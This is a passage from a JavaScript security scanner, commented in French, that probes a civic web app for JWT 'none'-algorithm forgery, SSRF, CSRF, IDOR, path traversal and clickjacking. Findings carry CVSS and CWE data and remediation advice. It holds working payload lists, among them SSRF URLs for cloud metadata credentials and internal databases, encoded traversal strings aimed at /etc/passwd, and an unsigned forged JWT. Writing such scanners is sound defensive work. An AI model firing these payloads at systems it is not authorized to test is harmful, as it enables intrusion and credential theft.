              endpoint: '/users/me',
              method: 'GET',
              originalToken: validToken.substring(0, 30) + '...',
              tamperedToken: tamperedToken.substring(0, 30) + '...',
              remediation: 'Toujours vérifier la signature JWT avant de faire confiance au payload',
              cvss: 9.8,
              cwe: 'CWE-347',
              owasp: 'A07:2021',
            });
          }
        } catch (error) {
          // Attendu - bonne sécurité
        }
        
        // Test: Algorithme "none"
        try {
          const noneAlgHeader = Buffer.from(
            JSON.stringify({ alg: 'none', typ: 'JWT' })
          ).toString('base64').replace(/=/g, '');
          const noneToken = `${noneAlgHeader}.${parts[1]}.`;
          
          const response = await this.axiosInstance.get(
            `${this.config.apiBaseUrl}/users/me`,
            {
              headers: { Authorization: `Bearer ${noneToken}` },
            }
          );
          
          if (response.status === 200 && response.data) {
            findings.push({
              severity: 'CRITICAL',
              category: 'JWT "none" Algorithm Attack',
              title: 'JWT avec algorithme "none" accepté',
              description: 'Le serveur accepte des JWT sans signature (alg: "none")',
              endpoint: '/users/me',
              method: 'GET',
              token: noneToken.substring(0, 30) + '...',
              remediation: 'Rejeter explicitement l\'algorithme "none" dans la vérification JWT',
              cvss: 9.8,
              cwe: 'CWE-347',
              owasp: 'A07:2021',
            });
          }
        } catch (error) {
          // Attendu - bonne sécurité
        }
      }
    }
    
    return { findings };
  }

  // ═══════════════════════════════════════════════════════════════════
  // A10:2021 – SSRF (Server-Side Request Forgery)
  // ═══════════════════════════════════════════════════════════════════

  async ssrfTests() {
    console.log('  [A10] Testing Server-Side Request Forgery...');
    const findings = [];
    
    const ssrfPayloads = [
      'http://localhost',
      'http://127.0.0.1',
      'http://0.0.0.0',
      'http://[::1]',
      'http://169.254.169.254/latest/meta-data/', // AWS metadata
      'http://metadata.google.internal/', // GCP metadata
      'http://localhost:5432', // PostgreSQL
      'http://localhost:6379', // Redis
      'http://localhost:27017', // MongoDB
      'file:///etc/passwd',
      'file:///c:/windows/system.ini',
      'dict://localhost:6379/info',
      'gopher://localhost:6379/_INFO',
    ];
    
    const ssrfEndpoints = [
      { endpoint: '/api/upload', field: 'url' },
      { endpoint: '/api/import', field: 'sourceUrl' },
      { endpoint: '/api/webhook', field: 'callbackUrl' },
      { endpoint: '/api/proxy', field: 'targetUrl' },
      { endpoint: '/api/fetch', field: 'url' },
    ];
    
    for (const { endpoint, field } of ssrfEndpoints) {
      for (const payload of ssrfPayloads) {
        try {
          const response = await this.axiosInstance.post(
            `${this.config.apiBaseUrl}${endpoint}`,
            { [field]: payload }
          );
          
          const responseText = JSON.stringify(response.data);
          
          // Indicateurs de SSRF réussi
          const indicators = [
            'root:',
            'postgres',
            'ami-id',
            'instance-id',
            'iam/security-credentials',
            '[boot loader]',
            'redis_version',
            'MongoDB',
          ];
          
          for (const indicator of indicators) {
            if (responseText.toLowerCase().includes(indicator.toLowerCase())) {
              findings.push({
                severity: 'CRITICAL',
                category: 'Server-Side Request Forgery',
                title: `SSRF dans ${endpoint}`,
                description: `Le serveur a accédé à une ressource interne avec indicateur: "${indicator}"`,
                endpoint: endpoint,
                method: 'POST',
                field: field,
                payload: payload,
                response: {
                  status: response.status,
                  snippet: responseText.substring(0, 200),
                },
                remediation: 'Implémenter une whitelist d\'URLs et bloquer les plages IP privées',
                cvss: 9.9,
                cwe: 'CWE-918',
                owasp: 'A10:2021',
              });
              break;
            }
          }
        } catch (error) {
          // Continue
        }
      }
    }
    
    return { findings };
  }

  // ═══════════════════════════════════════════════════════════════════
  // CSRF (Cross-Site Request Forgery)
  // ═══════════════════════════════════════════════════════════════════

  async csrfTests() {
    console.log('  Testing CSRF Protection...');
    const findings = [];
    
    const token = await this.getToken('citoyen');
    if (!token) return { findings };
    
    // Endpoints qui modifient l'état (state-changing)
    const stateChangingEndpoints = [
      { endpoint: '/api/reclamations', method: 'POST' },
      { endpoint: '/api/evaluations', method: 'POST' },
      { endpoint: '/api/users/me', method: 'PATCH' },
      { endpoint: '/api/users/me/password', method: 'PATCH' },
      { endpoint: '/api/etablissements/1/subscribe', method: 'POST' },
    ];
    
    for (const { endpoint, method } of stateChangingEndpoints) {
      try {
        // Requête depuis une origine malveillante
        const response = await this.axiosInstance({
          method: method,
          url: `${this.config.apiBaseUrl}${endpoint}`,
          headers: {
            Authorization: `Bearer ${token}`,
            Origin: 'https://evil-attacker.com',
            Referer: 'https://evil-attacker.com/attack-page',
          },
          data: {
            test: 'csrf-attack-test',
            titre: 'Test CSRF',
            description: 'Test CSRF Attack',
            categorie: 'INFRASTRUCTURE',
            communeId: 1,
          },
        });
        
        if (response.status === 200 || response.status === 201) {
          findings.push({
            severity: 'HIGH',
            category: 'CSRF Vulnerability',
            title: `Protection CSRF manquante sur ${endpoint}`,
            description: 'L\'endpoint accepte les requêtes depuis des origines non autorisées',
            endpoint: endpoint,
            method: method,
            attackOrigin: 'https://evil-attacker.com',
            response: {
              status: response.status,
            },
            remediation: 'Implémenter la validation du token CSRF pour toutes les opérations qui modifient l\'état',
            cvss: 8.1,
            cwe: 'CWE-352',
            owasp: 'CSRF',
          });
        }
      } catch (error) {
        // Attendu si protection CSRF existe
      }
    }
    
    return { findings };
  }

  // ═══════════════════════════════════════════════════════════════════
  // IDOR (Insecure Direct Object References)
  // ═══════════════════════════════════════════════════════════════════

  async idorTests() {
    console.log('  Testing IDOR Vulnerabilities...');
    const findings = [];
    
    const token = await this.getToken('citoyen');
    if (!token) return { findings };
    
    // Test d'énumération d'IDs numériques
    const idorEndpoints = [
      '/api/reclamations',
      '/api/users',
      '/api/evaluations',
      '/api/documents',
      '/api/evenements',
    ];
    
    for (const baseEndpoint of idorEndpoints) {
      // Essayer d'accéder à plusieurs IDs
      for (let id = 1; id <= 10; id++) {
        try {
          const response = await this.axiosInstance.get(
            `${this.config.apiBaseUrl}${baseEndpoint}/${id}`,
            {
              headers: { Authorization: `Bearer ${token}` },
            }
          );
          
          if (response.status === 200 && response.data) {
            // Vérifier si la ressource appartient à l'utilisateur actuel
            const ownerField = response.data.userId || response.data.citoyenId || response.data.user?.id;
            
            // Si on peut accéder à des ressources qui ne nous appartiennent pas
            if (ownerField) {
              findings.push({
                severity: 'HIGH',
                category: 'IDOR',
                title: `IDOR potentiel dans ${baseEndpoint}/${id}`,
                description: 'L\'utilisateur peut accéder à des ressources appartenant à d\'autres utilisateurs',
                endpoint: `${baseEndpoint}/${id}`,
                method: 'GET',
                resourceId: id,
                response: {
                  status: response.status,
                  hasData: true,
                },
                remediation: 'Vérifier la propriété des ressources avant de les retourner',
                cvss: 7.5,
                cwe: 'CWE-639',
                owasp: 'IDOR',
              });
              break; // Un seul exemple par endpoint
            }
          }
        } catch (error) {
          // Continue
        }
      }
    }
    
    return { findings };
  }

  // ═══════════════════════════════════════════════════════════════════
  // PATH TRAVERSAL / LFI
  // ═══════════════════════════════════════════════════════════════════

  async pathTraversal() {
    console.log('  Testing Path Traversal...');
    const findings = [];
    
    const lfiPayloads = [
      '../../../../../etc/passwd',
      '..\\..\\..\\..\\..\\windows\\system.ini',
      '....//....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '/etc/passwd',
      'C:\\windows\\system.ini',
      '....\/....\/....\/etc/passwd',
      '..%c0%af..%c0%af..%c0%afetc/passwd',
    ];
    
    const fileEndpoints = [
      '/api/files',
      '/api/download',
      '/uploads',
      '/static',
      '/api/export',
      '/api/attachment',
    ];
    
    for (const endpoint of fileEndpoints) {
      for (const payload of lfiPayloads) {
        try {
          const response = await this.axiosInstance.get(
            `${this.config.target}${endpoint}/${encodeURIComponent(payload)}`
          );
          
          const responseText = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
          
          if (
            responseText.includes('root:') ||
            responseText.includes('[boot loader]') ||
            responseText.includes('for 16-bit app support')
          ) {
            findings.push({
              severity: 'CRITICAL',
              category: 'Path Traversal / LFI',
              title: `Path traversal dans ${endpoint}`,
              description: `Accès au fichier système réussi avec payload: ${payload}`,
              endpoint: `${endpoint}/${payload}`,
              method: 'GET',
              payload: payload,
              response: {
                status: response.status,
                snippet: responseText.substring(0, 100),
              },
              remediation: 'Sanitizer les chemins de fichiers et utiliser une whitelist',
              cvss: 9.3,
              cwe: 'CWE-22',
              owasp: 'Path Traversal',
            });
          }
        } catch (error) {
          // Continue
        }
      }
    }
    
    return { findings };
  }

  // ═══════════════════════════════════════════════════════════════════
  // CLICKJACKING
  // ═══════════════════════════════════════════════════════════════════

  async clickjackingTest() {
    console.log('  Testing Clickjacking Protection...');
    const findings = [];
    
    try {
      const response = await this.axiosInstance.get(this.config.target);
      
      const xFrameOptions = response.headers['x-frame-options'];
      const csp = response.headers['content-security-policy'];
      
      let isProtected = false;
      
      if (xFrameOptions && (xFrameOptions.toUpperCase() === 'DENY' || xFrameOptions.toUpperCase() === 'SAMEORIGIN')) {
        isProtected = true;
      }
      
      if (csp && csp.includes('frame-ancestors')) {
        isProtected = true;
      }
      
      if (!isProtected) {
        findings.push({
          severity: 'MEDIUM',
          category: 'Clickjacking',
          title: 'Pas de protection clickjacking',
          description: 'L\'application peut être intégrée dans des iframes par des sites malveillants',
          endpoint: this.config.target,
          method: 'GET',
          missingHeaders: {
            'X-Frame-Options': 'DENY ou SAMEORIGIN',
            'Content-Security-Policy': "frame-ancestors 'self'",
          },
          remediation: 'Ajouter X-Frame-Options ou CSP frame-ancestors header',
          cvss: 6.1,
          cwe: 'CWE-1021',
          owasp: 'Clickjacking',
        });
      }
    } catch (error) {
      // Continue
    }
    
    return { findings };
  }
}
